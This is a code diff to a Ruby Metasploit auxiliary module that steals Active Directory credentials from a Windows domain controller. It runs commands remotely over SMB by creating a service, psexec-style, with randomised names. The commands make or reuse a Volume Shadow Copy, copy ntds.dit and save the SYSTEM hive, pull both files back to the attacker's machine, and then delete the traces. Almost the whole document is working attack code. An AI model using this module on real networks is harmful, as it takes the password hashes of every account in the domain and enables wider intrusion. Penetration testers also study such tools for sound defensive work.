@@ -40,7 +40,9 @@ class Metasploit3 < Msf::Auxiliary
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
-			OptString.new('RPORT', [true, 'The Target port', 445]),
+			OptInt.new('RPORT', [true, 'The target port', 445]),
+			OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
+			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', '\WINDOWS\\']),
 		], self.class)
 
 		deregister_options('RHOST')
@@ -48,9 +50,15 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
+	def peer
+		return "#{rhost}:#{rport}"
+	end
+
+
+
 	# This is the main control method
 	def run_host(ip)
-		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
+		text = datastore['WINPATH'] + 'Temp\\' + "#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
 		logdir = datastore['LOGDIR']
@@ -65,25 +73,35 @@ class Metasploit3 < Msf::Auxiliary
 				return
 			end
 
-			if vscpath = check_vss(smbshare, ip, text, bat)
-				#Check if VSC Already exists
-				n = copy_ntds(smbshare, ip, vscpath)
+			if datastore['VSCPATH'].length > 0
+				print_status("#{peer} - Attempting to grab NTDS.dit from #{datastore['VSCPATH']}")
+				n = copy_ntds(smbshare, ip, datastore['VSCPATH'])
 				s = copy_sys_hive(smbshare, ip)
-				if n == nil && s == nil 
-					# If the above succeeds then we just have to download our files
-					download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip, logdir)
-					download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
+				if n && s
+					download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
+					download_sys_hive(smbshare, (datastore['WINPATH'] + "Temp\\sys"), ip, logdir)
 				end
 			else
-				# If VSC doesn't exists already then we see if we can create a new VSC
-				if vscpath = make_volume_shadow_copy(smbshare, ip, createvsc, text, bat)
-					# If we are successul, try and copy NTDS.dit and SYSTEM hive files
+				if vscpath = check_vss(smbshare, ip, text, bat)
+					#Check if VSC Already exists
 					n = copy_ntds(smbshare, ip, vscpath)
 					s = copy_sys_hive(smbshare, ip)
-					if n == nil && s == nil 
+					if n && s
 						# If the above succeeds then we just have to download our files
-						download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip, logdir)
-						download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
+						download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
+						download_sys_hive(smbshare, (datastore['WINPATH'] + "Temp\\sys"), ip, logdir)
+					end
+				else
+					# If VSC doesn't exists already then we see if we can create a new VSC
+					if vscpath = make_volume_shadow_copy(smbshare, ip, createvsc, text, bat)
+						# If we are successul, try and copy NTDS.dit and SYSTEM hive files
+						n = copy_ntds(smbshare, ip, vscpath)
+						s = copy_sys_hive(smbshare, ip)
+						if n && s
+							# If the above succeeds then we just have to download our files
+							download_ntds(smbshare, (datastore['WINPATH'] + "Temp\\ntds"), ip, logdir)
+							download_sys_hive(smbshare, (datastore['WINPATH'] + "Temp\\sys"), ip, logdir)
+						end
 					end
 				end
 			end
@@ -101,17 +119,15 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("#{ip} - Checking if a Volume Shadow Copy exists already.")
 			# Check is VSC already exists
 			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
-			simple.connect(smbshare)
 			command = "%COMSPEC% /C echo vssadmin list shadows ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
-			psexec(smbshare, command)
+			result = psexec(command)
 			simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 			outfile = simple.open(text, 'ro')
 			data = outfile.read
 			vscs = Array.new
 			simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 			cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
-			simple.connect(smbshare)
-			psexec(smbshare, cleanup)
+			result = psexec(cleanup)
 			data.each_line { |line| vscs << line if line.include?("GLOBALROOT") }
 			if vscs.empty?
 				print_status("#{ip} - No VSC Found.")
@@ -162,11 +178,9 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Copying ntds.dit to Windows Temp directory")
 		begin
 			# Try to copy ntds.dit from VSC
-			ntdspath = vscpath.to_s + "\\WINDOWS\\NTDS\\ntds.dit"
+			ntdspath = vscpath.to_s + datastore['WINPATH'] + "NTDS\\ntds.dit"
 			command = "%COMSPEC% /C copy /Y #{ntdspath} %WINDIR%\\Temp\\ntds"
-			simple.connect(smbshare)
-			psexec(smbshare, command)
-			return nil
+			return psexec(command)
 		rescue StandardError => ntdscopyerror
 			print_error("Unable to copy ntds.dit from Volume Shadow Copy.  Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
 			return ntdscopyerror
@@ -182,9 +196,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try to crate the sys hive copy
 			command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
-			simple.connect(smbshare)
-			psexec(smbshare, command)
-			return nil
+			return psexec(command)
 		rescue StandardError => hiveerror
 			print_error("Unable to copy the SYSTEM hive file: #{hiveerror}")
 			return hiveerror
@@ -247,8 +259,7 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			# Try to delete the ntds.dit and SYSTEM hive copies
 			command = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\ntds & del /F /Q %WINDIR%\\Temp\\sys"
-			simple.connect(smbshare)
-			psexec(smbshare, command)
+			result = psexec(command)
 		rescue StandardError => deleteerror
 			print_error("Unable to delete ntds.dit and SYSTEM hive copies: #{deleteerror}")
 			return deleteerror
@@ -281,19 +292,16 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	def psexec(smbshare, command)
-		filename = "filename"
-		servicename = "servicename"
-		simple.disconnect(smbshare)
+		def psexec(command)
 
 		simple.connect("IPC$")
 
 		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
-		vprint_status("Binding to #{handle} ...")
+		vprint_status("#{peer} - Binding to #{handle} ...")
 		dcerpc_bind(handle)
-		vprint_status("Bound to #{handle} ...")
+		vprint_status("#{peer} - Bound to #{handle} ...")
 
-		vprint_status("Obtaining a service manager handle...")
+		vprint_status("#{peer} - Obtaining a service manager handle...")
 		scm_handle = nil
 		stubdata =
 			NDR.uwstring("\\\\#{rhost}") +
@@ -305,14 +313,15 @@ class Metasploit3 < Msf::Auxiliary
 				scm_handle = dcerpc.last_response.stub_data[0,20]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		displayname = "displayname"
+		servicename = Rex::Text.rand_text_alpha(11)
+		displayname = Rex::Text.rand_text_alpha(16)
 		holdhandle = scm_handle
-		svc_handle  = nil
-		svc_status  = nil
+		svc_handle = nil
+		svc_status = nil
 
 		stubdata =
 			scm_handle +
@@ -330,26 +339,26 @@ class Metasploit3 < Msf::Auxiliary
 			NDR.long(0) + # Password
 			NDR.long(0) + # Password
 			NDR.long(0) + # Password
-			NDR.long(0)  # Password
+			NDR.long(0) # Password
 		begin
-			vprint_status("Attempting to execute #{command}")
+			vprint_status("#{peer} - Creating the service...")
 			response = dcerpc.call(0x0c, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 				svc_handle = dcerpc.last_response.stub_data[0,20]
 				svc_status = dcerpc.last_response.stub_data[24,4]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Closing service handle...")
+		vprint_status("#{peer} - Closing service handle...")
 		begin
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception
 		end
 
-		vprint_status("Opening service...")
+		vprint_status("#{peer} - Opening service...")
 		begin
 			stubdata =
 				scm_handle +
@@ -361,11 +370,11 @@ class Metasploit3 < Msf::Auxiliary
 				svc_handle = dcerpc.last_response.stub_data[0,20]
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Starting the service...")
+		vprint_status("#{peer} - Starting the service...")
 		stubdata =
 			svc_handle +
 			NDR.long(0) +
@@ -375,48 +384,31 @@ class Metasploit3 < Msf::Auxiliary
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
+			print_error("#{peer} - Error: #{e}")
+			return false
 		end
 
-		vprint_status("Removing the service...")
+		vprint_status("#{peer} - Removing the service...")
 		stubdata =
-			svc_handle +
-			NDR.wstring("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
+			svc_handle
 		begin
 			response = dcerpc.call(0x02, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
+		end
+			rescue ::Exception => e
+			print_error("#{peer} - Error: #{e}")
 		end
 
-		vprint_status("Closing service handle...")
+		vprint_status("#{peer} - Closing service handle...")
 		begin
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("#{peer} - Error: #{e}")
 		end
 
-		begin
-			#print_status("Deleting \\#{filename}...")
-			select(nil, nil, nil, 1.0)
-			#This is not really useful but will prevent double \\ on the wire :)
-		if datastore['SHARE'] =~ /.[\\\/]/
-			simple.connect(smbshare)
-			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
-		else
-			simple.connect(smbshare)
-			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
-		end
-
-		rescue ::Interrupt
-			raise $!
-		rescue ::Exception
-			#raise $!
-		end
+		select(nil, nil, nil, 1.0)
 		simple.disconnect("IPC$")
-		simple.disconnect(smbshare)
+		return true
 	end
 
 end
